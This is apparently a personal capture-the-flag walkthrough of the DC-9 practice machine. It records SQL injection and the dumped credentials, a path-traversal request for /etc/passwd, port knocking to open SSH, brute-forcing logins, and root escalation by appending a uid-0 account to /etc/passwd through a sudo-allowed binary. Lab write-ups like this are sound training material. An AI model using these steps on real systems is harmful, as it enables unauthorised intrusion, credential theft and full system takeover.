----------------------------------------------------
# Author -> Shubham Rannpise
----------------------------------------------------
# DC-9
# 23/12/2022

----------------------------------------------------
# nmap result
----------------------------------------------------
STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))

----------------------------------------------------
SQLi
----------------------------------------------------
databases
->information_schema
->Staff
->users

tables
->Users
->UserDetails

Users
columns
->UserID
->Username
->Password

Data
->admin
->856f5de590ef37314e7c3bdf6f8a66dc
->transorbital1

----------------------------------------------------
admin login
----------------------------------------------------
when logged in it showed "file does not exist"
http://10.0.2.21/welcome.php?file=../../../../etc/passwd


----------------------------------------------------
trying to login with ssh
----------------------------------------------------
http://10.0.2.21/manage.php?file=../../../../etc/knockd.conf
File does not exist
[options] UseSyslog [openSSH] sequence = 7469,8475,9842 seq_timeout = 25 command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn [closeSSH] sequence = 9842,8475,7469 seq_timeout = 25 command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn 

we have to trigger 9842,8475,7469  these ports in sequence
in order to open ssh port

for x in 7469 8475 9842; do nmap -vv 10.0.2.21 -p$x; done

the port 22 for ssh is open

now brute force the ssh from database usernames and password that we found previously from users database

Creds
chandlerb UrAG0D!
joeyt Passw0rd
janitor Ilovepeepee

we got a shell
----------------------------------------------------
Previlege escalation
----------------------------------------------------
login with janitor
-> ls -la
.secrets-for-putin
-> cd .secrets-for-putin
-> ls
passwords-found-on-post-it-notes.txt
-> cat passwords-found-on-post-it-notes.txt
BamBam01
Passw0rd
smellycats
P0Lic#10-4
B4-Tru3-001
4uGU5T-NiGHts


got more passwords
 now brute force ssh again

 we got fredf password B4-Tru3-001
 now login with fredf

 -> sudo -l
     (root) NOPASSWD: /opt/devstuff/dist/test/test

     its bin file 


research this things /devstuff/dist/ on google

-> cd /opt/devstuff$
-> ls
-> cat test.py
#!/usr/bin/python

import sys

if len (sys.argv) != 3 :
    print ("Usage: python test.py read append")
    sys.exit (1)

else :
    f = open(sys.argv[1], "r")
    output = (f.read())

    f = open(sys.argv[2], "a")
    f.write(output)
    f.close()

this file 
getting a file from our inpute
reading it
copying it
to any given destination file

so lets add new user with id 0 as root in /etc/passwd

shub:x:0:0:root:/root:/bin/bash

so for that generate the password
-> openssl passwd -6 -salt abc abc
$6$abc$feY2G1TnANZ0KTBaV0Kkb3kO0521w9Wfvr8bW8wL0T11tXMxEhkG9poIhCuNFR3zasFDn.iplGDXaEJxlLwPt0
now make file with the new user line in /tmp


shub:$6$abc$feY2G1TnANZ0KTBaV0Kkb3kO0521w9Wfvr8bW8wL0T11tXMxEhkG9poIhCuNFR3zasFDn.iplGDXaEJxlLwPt0:0:0:root:/root:/bin/bash


-> sudo /opt/devstuff/dist/test/test /tmp/my /etc/passwd
you added new user with root previleges
 
 -> su shub
 password abc

 you got root

----------------------------------------------------
Flag
----------------------------------------------------

 root@dc-9:~# cat theflag.txt 


███╗   ██╗██╗ ██████╗███████╗    ██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗██╗██╗██╗
████╗  ██║██║██╔════╝██╔════╝    ██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝██║██║██║
██╔██╗ ██║██║██║     █████╗      ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ ██║██║██║
██║╚██╗██║██║██║     ██╔══╝      ██║███╗██║██║   ██║██╔══██╗██╔═██╗ ╚═╝╚═╝╚═╝
██║ ╚████║██║╚██████╗███████╗    ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗██╗██╗██╗
╚═╝  ╚═══╝╚═╝ ╚═════╝╚══════╝     ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝╚═╝
                                                                             
Congratulations - you have done well to get to this point.

Hope you enjoyed DC-9.  Just wanted to send out a big thanks to all those
who have taken the time to complete the various DC challenges.

I also want to send out a big thank you to the various members of @m0tl3ycr3w .

They are an inspirational bunch of fellows.

Sure, they might smell a bit, but...just kidding.  :-)

Sadly, all things must come to an end, and this will be the last ever
challenge in the DC series.

So long, and thanks for all the fish.

